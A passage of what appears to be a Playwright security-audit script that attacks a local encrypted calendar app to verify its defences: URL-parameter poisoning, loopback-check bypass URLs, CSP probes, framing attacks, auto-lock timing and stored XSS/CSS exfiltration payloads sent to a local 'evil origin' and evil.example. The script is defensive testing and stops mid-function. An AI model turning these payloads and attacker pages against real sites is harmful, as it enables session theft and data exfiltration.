// VP3R — client web-surface re-attack (local stack: client 8080, worker 8787,
// in-process evil origin 9778). Run under:
//   NODE_PATH=/home/z/.npm-global/lib/node_modules \
//   bash scripts/with-stack.sh --fresh node audit-vp/vp3r-local.mjs
// Every finding is proven in-browser; refuted attacks carry evidence too.
// Tokens are NEVER printed in full (8-char redaction everywhere).
import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';

const APP = 'http://127.0.0.1:8080/index.html';
const APPORIGIN = 'http://127.0.0.1:8080';
const WORKER = 'http://127.0.0.1:8787';
const EVIL_PORT = 9778;
const EVIL = `http://127.0.0.1:${EVIL_PORT}`;
const MAT = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));
const ADMIN = readFileSync('worker/.dev.vars', 'utf8').match(/^ADMIN_SECRET=(.+)$/m)[1].trim();
const PW = 'password';
const TE = new TextEncoder();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const red = (s) => String(s == null ? '' : s).slice(0, 8) + '…';
const results = [];
function res(id, ok, note = '') {
  results.push({ id, ok, note });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${id}${note ? '  — ' + note : ''}`);
}
const hexB = (h) => new Uint8Array(h.match(/../g).map((x) => parseInt(x, 16)));
const b64 = (u8) => Buffer.from(u8).toString('base64');
const u32be = (n) => new Uint8Array([(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255]);

/* ---------- row-crafting helpers (node-side, mirrors crypto.js) ---------- */
async function encRow(id, ver, text) {
  const key = await crypto.subtle.importKey('raw', hexB(MAT.k_data_hex), 'AES-GCM', false, ['encrypt']);
  const nonce = crypto.getRandomValues(new Uint8Array(12));
  const aad = new Uint8Array([...TE.encode(id), ...u32be(ver)]);
  const ct = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: nonce, additionalData: aad }, key, TE.encode(text));
  return { ver, nonce: b64(nonce), ct: b64(new Uint8Array(ct)) };
}
async function putRow(id, body) {
  const r = await fetch(`${WORKER}/rows/${encodeURIComponent(id)}`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${MAT.auth_ui_hex}`, 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error('put failed ' + id + ' ' + r.status);
}
async function delRow(id) {
  await fetch(`${WORKER}/rows/${encodeURIComponent(id)}`, { method: 'DELETE', headers: { authorization: `Bearer ${MAT.auth_ui_hex}` } });
}

/* ---------- crafted attacker rows (evt:vp3r-* / cmeta:vp3r-*, self-deleted) ---------- */
const calUuid = crypto.randomUUID();
const calUuid2 = crypto.randomUUID();
const uid = 'vp3r-style-1';
const p2d = (n) => String(n).padStart(2, '0');
const today = new Date();
const D = `${today.getUTCFullYear()}${p2d(today.getUTCMonth() + 1)}${p2d(today.getUTCDate())}`;
const EX_SUM = 'VP3MARKER <style>html{background:url(http://127.0.0.1:9778/sum-style)}</style>';
const EX_DESC = 'desc-marker background:url(//127.0.0.1:9778/desc-style) <img src=x onerror="fetch(\'http://127.0.0.1:9778/desc-img\')">';
const EX_LOC = 'url(//127.0.0.1:9778/loc-style)';
const evtPayload = [
  'BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//vp3r//EN', 'BEGIN:VEVENT',
  `UID:${uid}`, 'DTSTAMP:20260101T000000Z', `DTSTART:${D}T120000Z`, `DTEND:${D}T130000Z`,
  `SUMMARY:${EX_SUM}`, `DESCRIPTION:${EX_DESC}`, `LOCATION:${EX_LOC}`,
  'END:VEVENT', 'END:VCALENDAR', '',
].join('\r\n');
const hostileName = 'VP3MARKER-cal <style>x{background:url(//127.0.0.1:9778/cmeta-style)}</style>';
await putRow(`cmeta:${calUuid}`, await encRow(`cmeta:${calUuid}`, 1, JSON.stringify({ v: 1, name: hostileName, color: '#3B82F6' })));
await putRow(`evt:${calUuid}:${uid}`, await encRow(`evt:${calUuid}:${uid}`, 1, evtPayload));
await putRow(`cmeta:${calUuid2}`, await encRow(`cmeta:${calUuid2}`, 1, JSON.stringify({ v: 1, name: 'bad-color-cal', color: 'url(//127.0.0.1:9778/color-style)' })));

/* ---------- in-process evil origin (attacker pages + exfil listener) ---------- */
const evilHits = [];
function framePage(attrs, extra = '') {
  return `<!doctype html><html><body style="margin:0"><h1>EVIL</h1>
  <iframe id="f" src="${APP}" ${attrs} style="width:1000px;height:640px"></iframe>${extra}</body></html>`;
}
const EVIL_PAGES = {
  '/frame-plain': framePage(''),
  '/frame-sandbox': framePage('sandbox="allow-scripts"', '<script>f.name="vp3r-name-trick"</script>'),
  '/frame-sandbox-so': framePage('sandbox="allow-scripts allow-same-origin"'),
  '/frame-sandbox-topnav': framePage('sandbox="allow-scripts allow-top-navigation"'),
  '/frame-srcdoc': `<!doctype html><html><body style="margin:0"><h1>EVIL srcdoc</h1>
  <iframe id="f" sandbox="allow-scripts" style="width:1000px;height:640px"></iframe>
  <script>document.getElementById('f').srcdoc='<!doctype html><iframe src="${APP}" style="width:95%;height:95%"></iframe>';</script></body></html>`,
};
const evil = createServer((req, resp) => {
  evilHits.push(req.url);
  const p = new URL(req.url, 'http://x').pathname;
  if (EVIL_PAGES[p]) {
    resp.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
    resp.end(EVIL_PAGES[p]);
    return;
  }
  resp.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
  resp.end('evil-reached:' + p);
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));

const browser = await chromium.launch();

async function appPage({ seed = {}, clock = false } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const page = await ctx.newPage();
  if (clock) await page.clock.install({ time: new Date() });
  await page.addInitScript((seed) => {
    if (location.origin === 'http://127.0.0.1:8080') {
      for (const [k, v] of Object.entries(seed)) { try { localStorage.setItem(k, v); } catch { } }
    }
  }, seed);
  return { ctx, page };
}
async function ls(page, k) { return page.evaluate((k) => localStorage.getItem(k), k); }
async function toasts(page) {
  return page.evaluate(() => [...document.querySelectorAll('#toasts .toast')].map((t) => t.textContent));
}
async function unlockIn(page, { server = WORKER, password = PW } = {}) {
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await page.fill('#server', server);
  await page.fill('#password', password);
  await page.click('#login-form button[type=submit]');
  await page.waitForSelector('#app:not([hidden])', { timeout: 25000 });
  // FC v7 root carries hashed theme utility classes, NOT .fc — the repo's own
  // e2e (scripts/e2e-prod.mjs:42) waits on #calendar [data-date].
  await page.waitForSelector('#calendar [data-date]', { timeout: 15000 });
}
const isLocked = (page) => page.evaluate(() => !document.getElementById('login').hidden);
async function watchNet(page) {
  const reqs = [], fails = [];
  page.on('request', (r) => reqs.push(r.url()));
  page.on('requestfailed', (r) => fails.push({ url: r.url(), err: r.failure()?.errorText }));
  return { reqs, fails };
}

/* ============ S1 — ingestParams (JOB 1: server/setup params) ============ */
try {
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '?server=https%3A%2F%2Fevil.example%2F', { waitUntil: 'domcontentloaded' });
    await sleep(500);
    const srv = await ls(page, 'clock_poc_server');
    const t = await toasts(page);
    res('S1a ?server=remote ignored', srv === null, `LS=${srv}`);
    res('S1b ?server=remote toast', t.some((x) => x.includes('Ignored a server address')), (t[0] || '').slice(0, 60));
    res('S1c URL cleaned', (await page.evaluate(() => location.search + location.hash)) === '', await page.evaluate(() => JSON.stringify(location.search + location.hash)));
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '#server=' + encodeURIComponent('https://evil.example/'), { waitUntil: 'domcontentloaded' });
    await sleep(500);
    res('S1d #server=remote ignored', (await ls(page, 'clock_poc_server')) === null);
    res('S1e #server=remote toast', (await toasts(page)).some((x) => x.includes('Ignored a server address')));
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '#server=' + encodeURIComponent('http://localhost:8787/'), { waitUntil: 'domcontentloaded' });
    await sleep(500);
    res('S1f #server=localhost:8787 stored', (await ls(page, 'clock_poc_server')) === 'http://localhost:8787', await ls(page, 'clock_poc_server'));
    res('S1g stored toast', (await toasts(page)).some((x) => x.includes('Server set from link')));
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '#server=' + encodeURIComponent('http://127.0.0.1:8787'), { waitUntil: 'domcontentloaded' });
    await sleep(400);
    res('S1h #server=127.0.0.1:8787 stored', (await ls(page, 'clock_poc_server')) === 'http://127.0.0.1:8787');
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_server: 'https://attacker.example/' } });
    await page.goto(APP, { waitUntil: 'domcontentloaded' });
    await sleep(500);
    const note = await page.evaluate(() => {
      const n = document.getElementById('server-note');
      return { hidden: n.hidden, text: n.textContent };
    });
    res('S1i poisoned-server warning shown', note.hidden === false && note.text.includes('NON-DEFAULT server') && note.text.includes('attacker.example'), note.text.slice(0, 70));
    res('S1j form prefilled w/ poisoned srv', (await page.inputValue('#server')) === 'https://attacker.example/');
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '#setup=' + 'b'.repeat(64), { waitUntil: 'domcontentloaded' });
    await sleep(500);
    res('S1k #setup= fragment stored', (await ls(page, 'clock_poc_auth_ui')) === 'b'.repeat(64));
    res('S1l #setup= toast', (await toasts(page)).some((x) => x.includes('Provisioning code stored')));
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '?setup=' + 'c'.repeat(64), { waitUntil: 'domcontentloaded' });
    await sleep(500);
    res('S1m ?setup= query refused', (await ls(page, 'clock_poc_auth_ui')) === null);
    res('S1n ?setup= warn toast', (await toasts(page)).some((x) => x.includes('query string')));
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(APP + '#setup=zz', { waitUntil: 'domcontentloaded' });
    await sleep(400);
    res('S1o invalid #setup= refused+toast', (await ls(page, 'clock_poc_auth_ui')) === null && (await toasts(page)).some((x) => x.includes('invalid provisioning code')));
    await ctx.close();
  }
} catch (e) { res('S1 section crash', false, String(e).slice(0, 160)); }

/* ============ S2 — isLoopbackServer bypass matrix (JOB 2) ============ */
try {
  const PRED = `(u)=>{try{const x=new URL(u);if(x.protocol!=='http:'&&x.protocol!=='https:')return false;return x.hostname==='localhost'||x.hostname==='127.0.0.1'||x.hostname==='[::1]'||x.hostname.endsWith('.localhost')}catch{return false}}`;
  const candidates = [
    ['sub-evil', 'http://localhost.evil.example/'],
    ['ip-sub-evil', 'http://127.0.0.1.evil.example/'],
    ['hex-ip', 'http://0x7f000001/'],
    ['dec-ip', 'http://2130706433/'],
    ['short-ip', 'http://127.1/'],
    ['oct-ip', 'http://0177.0.0.1/'],
    ['v6-mapped', 'http://[::ffff:127.0.0.1]/'],
    ['userinfo-remote', 'http://127.0.0.1@evil.example/'],
    ['backslash-auth', 'http://evil.example\\@127.0.0.1/'],
    ['backslash-path', 'http://127.0.0.1\\@evil.example/'],
    ['pct-host', 'http://%6coc%61lhost/'],
    ['fullwidth-dot', 'http://localhost。evil.example/'],
    ['sub-localhost', 'http://x.localhost:9778/'],
    ['userinfo-loopback', 'http://me@127.0.0.1:8787/'],
    ['trailing-dot', 'http://localhost./'],
    ['v6-raw', 'http://[::1]:8787/'],
    ['https-localhost', 'https://localhost/'],
  ];
  const foreignDials = [];
  for (const [name, url] of candidates) {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: 'c'.repeat(64) } });
    await page.goto(APP + '#server=' + encodeURIComponent(url), { waitUntil: 'domcontentloaded' });
    await sleep(450);
    const stored = await ls(page, 'clock_poc_server');
    const pred = await page.evaluate(`(${PRED})(${JSON.stringify(url)})`);
    let dial = 'n/a';
    if (stored) {
      const net = await watchNet(page);
      await page.fill('#password', 'password');
      await page.click('#login-form button[type=submit]');
      await sleep(1500);
      const seen = [...net.reqs, ...net.fails.map((f) => f.url)].filter((u) => !u.startsWith(APPORIGIN) && !u.startsWith('data:'));
      const hosts = seen.map((u) => { try { return new URL(u).host; } catch { return '?'; } });
      dial = hosts.join(',') || 'none-emitted';
      for (const h of hosts) {
        if (!/^(localhost|127\.0\.0\.1|\[::1\]|x\.localhost)(:\d+)?$/.test(h)) foreignDials.push(name + '→' + h);
      }
    }
    res(`S2 ${name}`, true, `pred=${pred} stored=${stored ? 'YES ' + JSON.stringify(stored).slice(0, 50) : 'no'} dial=${dial}`);
    await ctx.close();
  }
  res('S2 SUMMARY: no stored candidate dials a non-loopback host', foreignDials.length === 0, foreignDials.join(' | ') || 'all dials loopback-or-CSP-blocked');
  // *.localhost resolution proof from a CSP-free page (evil origin):
  const { ctx: ectx, page: epage } = await appPage();
  await epage.goto(EVIL + '/frame-plain', { waitUntil: 'domcontentloaded' });
  const probe = await epage.evaluate(async () => {
    try { await fetch('http://x.localhost:9778/dns-probe'); return 'fetched'; }
    catch (e) { return 'err:' + String(e).slice(0, 50); }
  });
  await sleep(400);
  res('S2 x.localhost dials LOOPBACK (evil listener bound to 127.0.0.1 got the hit)', evilHits.includes('/dns-probe'), `probe=${probe}`);
  const ctrl = await epage.evaluate(async () => {
    try { await fetch('http://localhost.evil.example:9778/dns-ctrl'); return 'fetched'; }
    catch (e) { return 'err:' + String(e).slice(0, 40); }
  });
  await sleep(300);
  res('S2 localhost.evil.example does NOT reach the evil listener', !evilHits.includes('/dns-ctrl'), ctrl);
  await ectx.close();
} catch (e) { res('S2 section crash', false, String(e).slice(0, 160)); }

/* ============ S3 — CSP enforcement in the real page (JOB 1+2) ============ */
try {
  const { ctx, page } = await appPage();
  const cerrs = [];
  page.on('console', (m) => { if (m.type() === 'error') cerrs.push(m.text()); });
  page.on('pageerror', (e) => cerrs.push('pageerror:' + e.message));
  await page.goto(APP, { waitUntil: 'domcontentloaded' });
  await sleep(400);
  const before = evilHits.length;
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__vp3InlineRan = 1';
    document.body.appendChild(s);
    const s2 = document.createElement('script');
    s2.src = 'http://127.0.0.1:9778/remote.js';
    document.body.appendChild(s2);
    const st = document.createElement('style');
    st.textContent = 'html{background:url(http://127.0.0.1:9778/style-bg)}';
    document.head.appendChild(st);
    const st2 = document.createElement('style');
    st2.textContent = '@import url(http://127.0.0.1:9778/style-import);';
    document.head.appendChild(st2);
    const img = new Image();
    img.src = 'http://127.0.0.1:9778/img-exfil';
    document.body.appendChild(img);
    // NON-loopback foreign origin: loopback fetches are allowed by connect-src
    // BY DESIGN (dev stacks) — the exfil test must use a truly foreign host.
    fetch('https://evil.example/fetch-exfil').catch((e) => { window.__vp3FetchErr = String(e); });
  });
  // eval(): page.evaluate runs via CDP, which is NOT subject to page CSP — a
  // same-origin route-fulfilled script (allowed by script-src 'self') is the
  // honest probe for whether the page's own CSP blocks eval.
  await page.route('**/vp3-eval-probe.js', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: "try { eval('window.__vp3EvalRan = 1'); window.__vp3EvalOutcome='ran'; } catch (e) { window.__vp3EvalOutcome = 'blocked:' + e.name; }",
  }));
  const cdpEvalOutcome = await page.evaluate(() => {
    try { eval('window.__vp3CdpEvalRan = 1'); return 'cdp-eval-ok (CDP is CSP-exempt — not page evidence)'; } catch (e) { return 'blocked:' + e.name; }
  });
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.src = '/vp3-eval-probe.js';
    document.body.appendChild(s);
  });
  await sleep(900);
  const inlineRan = await page.evaluate(() => window.__vp3InlineRan);
  const pageEvalOutcome = await page.evaluate(() => window.__vp3EvalOutcome || 'script-not-run');
  const evalRan = await page.evaluate(() => window.__vp3EvalRan);
  const fetchErr = await page.evaluate(() => window.__vp3FetchErr);
  const bgApplied = await page.evaluate(() => getComputedStyle(document.documentElement).backgroundImage);
  const newHits = evilHits.slice(before);
  res('S3a inline script dead', inlineRan === undefined, `inlineRan=${inlineRan}`);
  res('S3b eval dead under the page CSP (same-origin script probe)', pageEvalOutcome.startsWith('blocked:') && evalRan === undefined, `page:${pageEvalOutcome} ${cdpEvalOutcome}`);
  res('S3c remote script blocked', !newHits.some((h) => h.includes('remote.js')), `hits=${newHits.join('|')}`);
  res('S3d foreign (non-loopback) fetch blocked by connect-src', fetchErr !== undefined && cerrs.some((c) => c.includes('connect-src')), `err=${fetchErr}`);
  res('S3e img exfil blocked by img-src', !newHits.some((h) => h.includes('img-exfil')));
  res('S3f style background:url exfil blocked by img-src (style itself applies)', !newHits.some((h) => h.includes('style-bg')) && bgApplied.includes('style-bg'), `computed bg=${bgApplied.slice(0, 50)} hits=0`);
  res('S3g style @import exfil blocked by style-src', !newHits.some((h) => h.includes('style-import')));
  res('S3h CSP console violations recorded', cerrs.some((c) => c.includes('Content Security Policy')), cerrs.length + ' console errors');
  await ctx.close();
} catch (e) { res('S3 section crash', false, String(e).slice(0, 160)); }

/* ============ S4 — frame-bust attacks (JOB 1+2) ============ */
try {
  {
    const { ctx, page } = await appPage();
    await page.goto(EVIL + '/frame-plain', { waitUntil: 'domcontentloaded' });
    await page.waitForURL('**/index.html**', { timeout: 8000 }).catch(() => { });
    await sleep(600);
    // Both outcomes are fail-safe for the app: the bust either ESCAPES (the
    // attacker page is replaced) or Chromium blocks the cross-origin top
    // navigation without a user gesture and the guard's hide fallback runs.
    const escaped = page.url().startsWith(APPORIGIN) && page.frames().length === 1;
    let vis = 'n/a';
    if (!escaped) {
      const fr = page.frames().find((f) => f.url().includes('8080'));
      vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    }
    res('S4a cross-origin plain frame: escaped OR hidden (both fail-safe)',
      escaped || vis === 'hidden', `url=${page.url()} frames=${page.frames().length} vis=${vis}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(EVIL + '/frame-sandbox', { waitUntil: 'domcontentloaded' });
    await sleep(900);
    const fr = page.frames().find((f) => f.url().includes('8080'));
    const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    const hit = fr ? await fr.evaluate(() => { const e = document.elementFromPoint(200, 300); return e ? e.tagName : 'none'; }) : 'no-frame';
    await page.screenshot({ path: 'audit-vp/vp3r-frame-sandbox-hidden.png' });
    res('S4b sandbox(no top-nav, window.name set) HIDDEN+inert', vis === 'hidden', `visibility=${vis} hit-test=${hit}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(EVIL + '/frame-sandbox-so', { waitUntil: 'domcontentloaded' });
    await sleep(900);
    const fr = page.frames().find((f) => f.url().includes('8080'));
    const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    res('S4c sandbox(+allow-same-origin, no top-nav) HIDDEN', vis === 'hidden', `visibility=${vis}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(EVIL + '/frame-sandbox-topnav', { waitUntil: 'domcontentloaded' });
    await page.waitForURL('**/index.html**', { timeout: 8000 }).catch(() => { });
    await sleep(500);
    const escaped2 = page.url().startsWith(APPORIGIN);
    let vis2 = 'n/a';
    if (!escaped2) {
      const fr2 = page.frames().find((f) => f.url().includes('8080'));
      vis2 = fr2 ? await fr2.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    }
    res('S4d sandbox(+allow-top-navigation): escaped OR hidden (both fail-safe)',
      escaped2 || vis2 === 'hidden', `url=${page.url()} vis=${vis2}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.goto(EVIL + '/frame-srcdoc', { waitUntil: 'domcontentloaded' });
    await sleep(1100);
    const fr = page.frames().find((f) => f.url().includes('8080'));
    const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    res('S4e srcdoc-chain frame HIDDEN', vis === 'hidden', `visibility=${vis}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage();
    await page.route('**/vp3r-attacker.html', (route) => route.fulfill({
      contentType: 'text/html',
      body: `<!doctype html><html><body style="margin:0"><h1>SAME-ORIGIN ATTACKER</h1><iframe id="f" src="/index.html" style="width:1000px;height:640px"></iframe></body></html>`,
    }));
    await page.goto(APPORIGIN + '/vp3r-attacker.html', { waitUntil: 'domcontentloaded' });
    await page.waitForURL('**/index.html**', { timeout: 8000 }).catch(() => { });
    await sleep(500);
    res('S4f same-origin plain frame ESCAPED', page.url() === APP, `url=${page.url()}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
    await page.route('**/vp3r-attacker2.html', (route) => route.fulfill({
      contentType: 'text/html',
      body: `<!doctype html><html><body style="margin:0"><h1>SAME-ORIGIN ATTACKER (sandbox so, strip)</h1>
      <iframe id="f" src="/index.html" sandbox="allow-scripts allow-same-origin" style="width:1000px;height:640px"></iframe>
      <script>
        document.getElementById('f').addEventListener('load', function onLoad() {
          try {
            const d = document.getElementById('f').contentDocument;
            for (const s of [...d.querySelectorAll('style')]) if (s.textContent.includes('visibility:hidden')) s.remove();
          } catch (e) { window.__stripErr = String(e); }
        });
      </script></body></html>`,
    }));
    await page.goto(APPORIGIN + '/vp3r-attacker2.html', { waitUntil: 'domcontentloaded' });
    await sleep(1200);
    const fr = page.frames().find((f) => f.url().includes('index.html'));
    const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
    let framedUnlock = false;
    if (fr) {
      try {
        await fr.fill('#password', PW);
        await fr.click('#login-form button[type=submit]');
        await fr.waitForSelector('#app:not([hidden]) #calendar [data-date]', { timeout: 20000 });
        framedUnlock = true;
      } catch { framedUnlock = false; }
    }
    await page.screenshot({ path: 'audit-vp/vp3r-frame-sameorigin-strip.png' });
    res('S4g same-origin+sandbox-so+style-strip → INTERACTIVE framed app (conditional)', vis === 'visible' && framedUnlock,
      `visibility=${vis} unlocked-in-frame=${framedUnlock} — requires attacker content ON the app origin`);
    await ctx.close();
  }
} catch (e) { res('S4 section crash', false, String(e).slice(0, 160)); }

/* ============ S5 — unlock + auto-lock (JOB 1) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER }, clock: true });
  const cerrs = [];
  page.on('pageerror', (e) => cerrs.push(String(e)));
  await unlockIn(page);
  const cache = await ls(page, 'clock_poc_cache_v45');
  const cfg = await ls(page, 'clock_poc_cfg_v45');
  res('S5a real unlock + render', true, `cfg=${cfg ? 'written' : 'MISSING'} cache=${cache ? 'written' : 'MISSING'} token=${red(MAT.auth_ui_hex)} pageErrs=${cerrs.length}`);
  const hook = await page.evaluate(() => typeof window.__autolockForce);
  res('S5b __autolockForce exists on loopback origin', hook === 'function', String(hook));
  await page.evaluate(() => window.__autolockForce());
  await sleep(300);
  res('S5c __autolockForce locks + purges cache', (await isLocked(page)) && (await ls(page, 'clock_poc_cache_v45')) === null);
  await unlockIn(page);
  await page.click('#btn-settings');
  await page.waitForSelector('#settings-modal .eventform', { timeout: 5000 });
  const al = await page.evaluate(() => {
    const c = document.getElementById('set-autolock');
    return c ? { exists: true, checked: c.checked } : { exists: false };
  });
  res('S5d auto-lock settings toggle exists+default-on', al.exists && al.checked, JSON.stringify(al));
  await page.evaluate(() => { document.getElementById('set-autolock').click(); });
  await page.click('#settings-modal .modal-footer .button-primary');
  await sleep(300);
  await page.clock.fastForward(16 * 60 * 1000);
  await sleep(300);
  res('S5e auto-lock OFF → no lock after 16min', !(await isLocked(page)));
  await page.click('#btn-settings');
  await page.waitForSelector('#settings-modal .eventform');
  await page.evaluate(() => { document.getElementById('set-autolock').click(); });
  await page.click('#settings-modal .modal-footer .button-primary');
  await sleep(300);
  await page.clock.fastForward(15 * 60 * 1000 + 2000);
  await sleep(300);
  const t = await toasts(page);
  res('S5f REAL 15-min idle timer locks + purges', (await isLocked(page)) && (await ls(page, 'clock_poc_cache_v45')) === null && t.some((x) => x.includes('Auto-locked after 15 minutes')));
  await ctx.close();
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER }, clock: true });
    await unlockIn(page);
    await page.clock.fastForward(10 * 60 * 1000);
    await page.evaluate(() => dispatchEvent(new Event('pointerdown')));
    await page.clock.fastForward(6 * 60 * 1000);
    await sleep(200);
    const mid = await isLocked(page);
    await page.clock.fastForward(10 * 60 * 1000 + 2000);
    await sleep(200);
    res('S5g activity re-arms window (no lock +16min, lock +26min)', mid === false && (await isLocked(page)) === true, `+16min locked=${mid}`);
    await ctx.close();
  }
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER }, clock: true });
    await unlockIn(page);
    await page.evaluate(() => { setInterval(() => dispatchEvent(new Event('pointerdown')), 700); });
    await page.clock.fastForward(30 * 60 * 1000);
    await sleep(300);
    res('S5h synthetic in-page activity defeats timer (needs in-page code = XSS-class)', !(await isLocked(page)), 'cross-origin pages cannot dispatch events into the app — refuted as external attack');
    await ctx.close();
  }
} catch (e) { res('S5 section crash', false, String(e).slice(0, 200)); }

/* ============ S6 — busy-state deferral of auto-lock (JOB 2) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER }, clock: true });
  await unlockIn(page);
  await page.waitForFunction(() => document.getElementById('syncbar').hidden, { timeout: 15000 });
  await page.evaluate(() => {
    window.__vp3OrigFetch = window.fetch;
    window.__vp3Hang = [];
    window.fetch = (u, o) => new Promise((res2, rej) => window.__vp3Hang.push({ rej }));
  });
  await page.click('#btn-add-calendar');
  await page.fill('#cal-modal input[aria-label="Name"]', 'vp3r-busy');
  await page.click('#cal-modal .modal-footer .button-primary');
  await page.waitForFunction(() => !document.getElementById('syncbar').hidden, { timeout: 5000 });
  await page.clock.fastForward(15 * 60 * 1000 + 2000);
  await sleep(400);
  const lockedWhileBusy = await isLocked(page);
  await page.evaluate(() => {
    for (const h of window.__vp3Hang) h.rej(new DOMException('vp3r release', 'AbortError'));
    window.__vp3Hang = [];
    window.fetch = window.__vp3OrigFetch;
  });
  await page.waitForFunction(() => document.getElementById('syncbar').hidden, { timeout: 10000 });
  await sleep(300);
  await page.clock.fastForward(20 * 60 * 1000);
  await sleep(400);
  const idleStillUnlocked = !(await isLocked(page));
  await page.evaluate(() => dispatchEvent(new Event('pointerdown')));
  await page.clock.fastForward(15 * 60 * 1000 + 2000);
  await sleep(400);
  const lockedAfterActivity = await isLocked(page);
  res('S6 busy-state deferral KILLS the auto-lock timer (no re-arm)',
    lockedWhileBusy === false && idleStillUnlocked === true && lockedAfterActivity === true,
    `busy-expiry locked=${lockedWhileBusy}; +20min idle unlocked=${idleStillUnlocked}; after-activity locked=${lockedAfterActivity}`);
  await ctx.close();
} catch (e) { res('S6 section crash', false, String(e).slice(0, 200)); }

/* ============ S7 — decrypted-content style/XSS exfil (JOB 2) ============ */
try {
  const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
  await unlockIn(page);
  await page.waitForSelector('.fc-event', { timeout: 15000 });
  await sleep(600);
  const chipText = await page.evaluate(() => document.querySelector('.fc-event')?.textContent || '');
  const calNames = await page.evaluate(() => [...document.querySelectorAll('#calendar-list li')].map((li) => li.textContent));
  await page.click('.fc-event');
  await page.waitForSelector('#event-popover:not([hidden])', { timeout: 5000 });
  await sleep(700);
  const popText = await page.evaluate(() => document.getElementById('event-popover').textContent);
  await page.screenshot({ path: 'audit-vp/vp3r-style-exfil-popover.png' });
  await page.click('#event-popover button[aria-label="Edit"]');
  await sleep(600);
  const editorVals = await page.evaluate(() => {
    const m = document.getElementById('editor-modal');
    return m && !m.hidden ? [...m.querySelectorAll('input')].map((i) => i.value).join('||').slice(0, 160) : 'no-editor';
  });
  await sleep(1200);
  const exfilHits = evilHits.filter((h) => /sum-style|desc-style|desc-img|loc-style|cmeta-style|color-style/.test(h));
  res('S7a chip renders payload as literal text', chipText.includes('VP3MARKER <style>'), JSON.stringify(chipText.slice(0, 55)));
  res('S7b hostile calendar NAME rendered as text', calNames.some((n) => n.includes('VP3MARKER-cal <style>')), calNames.join(' | ').slice(0, 90));
  res('S7c popover shows literal description', popText.includes('desc-marker background:url'), popText.slice(0, 70));
  res('S7d hostile COLOR calendar rejected (no render)', !calNames.some((n) => n.includes('bad-color-cal')), 'validateCalendarMeta ^#[0-9A-Fa-f]{6}$ gate');
  res('S7e ZERO exfil hits to evil origin', exfilHits.length === 0, `hits=${JSON.stringify(exfilHits)}`);
  res('S7f editor prefilled via value= (no breakout)', editorVals.includes('VP3MARKER'), editorVals.slice(0, 70));
  await ctx.close();
} catch (e) { res('S7 section crash', false, String(e).slice(0, 200)); }

/* ============ S8 — cache-fp pinning (JOB 1+2) ============ */
try {
  {
    const { ctx, page } = await appPage({ seed: { clock_poc_auth_ui: MAT.auth_ui_hex, clock_poc_server: WORKER } });
    await unlockIn(page);
    await page.waitForSelector('.fc-event', { timeout: 15000 }).catch(() => { });
    await sleep(800); // debounce cache write
    await page.close();
    const p3 = await ctx.newPage();
    await p3.goto(APP, { waitUntil: 'domcontentloaded' });
    await p3.route('**/config**', (r) => r.abort());
    await p3.route('**/rows**', (r) => r.abort());
    await p3.route('**/version**', (r) => r.abort());
    await p3.fill('#password', PW);
    await p3.click('#login-form button[type=submit]');
    await p3.waitForSelector('#app:not([hidden])', { timeout: 20000 });
    await sleep(1200);
    const ctrlChips = await p3.evaluate(() => document.querySelectorAll('.fc-event').length);
    // reload + tamper the fp → hydrate must refuse
    await p3.goto(APP, { waitUntil: 'domcontentloaded' });
    await p3.evaluate(() => {
